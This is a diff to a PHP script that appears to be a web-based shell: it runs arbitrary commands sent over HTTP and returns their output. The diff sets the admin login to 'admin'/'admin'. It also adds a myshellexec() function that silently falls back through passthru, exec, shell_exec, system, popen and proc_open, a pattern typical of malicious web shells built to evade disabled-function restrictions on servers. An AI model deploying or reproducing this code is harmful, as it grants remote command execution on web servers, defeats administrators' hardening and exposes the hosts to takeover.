@@ -1,5 +1,6 @@
 <?php
-$users = array('admin'=>'secret_password'); // change this!
+//$users = array('admin'=>'secret_password'); // change this!
+$users = array('admin'=>'admin'); // change this!
 $home = realpath('.'); // config
 
 function authenticate($u) {
@@ -316,7 +317,7 @@ function command()
     else if (!is_readable($real))
     { $output.="bash: $command: can't cd to directory\n";
     }
-    else 
+    else
     { $dir = $real;
     }
   }
@@ -328,20 +329,63 @@ function command()
     if (!file_exists($real))
     { $output.="bash: $command($real): No such file or directory\n";
     }
-    else 
+    else
     { $output.=ls($flags,$real);
     }
   }
   else
   { chdir($dir);
-    ob_start();
-    passthru($command." 2>&1");
-    $output.=ob_get_contents();
-    ob_end_clean();
+    $output=myshellexec($command." 2>&1");
   }
   if (substr($dir,0,strlen($home))==$home) $dir = '~'.substr($dir,strlen($home));
   $output = $processUser['name'].'@'.php_uname('n').':'.$olddir.'$ '.$command."\n".$output;
   echo json_encode(array('dir'=>$dir,'output'=>$output));
+}
+
+function myshellexec($cfe)
+{ $res = '';
+  if (!empty($cfe))
+  { if(@function_exists('passthru'))
+    { @ob_start();
+      @passthru($cfe);
+      $res = @ob_get_contents();
+      @ob_end_clean();
+    }
+    elseif(@function_exists('exec'))
+    { @exec($cfe,$res);
+      $res = join("\n",$res);
+    }
+    elseif(@function_exists('shell_exec'))
+    { $res = @shell_exec($cfe);
+    }
+    elseif(@function_exists('system'))
+    { @ob_start();
+      @system($cfe);
+      $res = @ob_get_contents();
+      @ob_end_clean();
+    }
+    elseif(@is_resource($f = @popen($cfe,"r")))
+    { $res = "";
+      if (@function_exists('fread') &&@function_exists('feof'))
+      { while(!@feof($f)) {$res .= @fread($f,1024);}
+      }
+      elseif(@function_exists('fgets') &&@function_exists('feof'))
+      { while(!@feof($f)) {$res .= @fgets($f,1024);}
+      }
+      @pclose($f);
+    }
+    elseif(@is_resource($f = @proc_open($cfe,array(1 =>array("pipe","w")),$pipes)))
+    { $res = "";
+      if(@function_exists('fread') &&@function_exists('feof'))
+      { while(!@feof($pipes[1])) {$res .= @fread($pipes[1],1024);}
+      }
+      elseif(@function_exists('fgets') &&@function_exists('feof'))
+      { while(!@feof($pipes[1])) {$res .= @fgets($pipes[1],1024);}
+      }
+      @proc_close($f);
+    }
+  }
+  return $res;
 }
 
 function view()
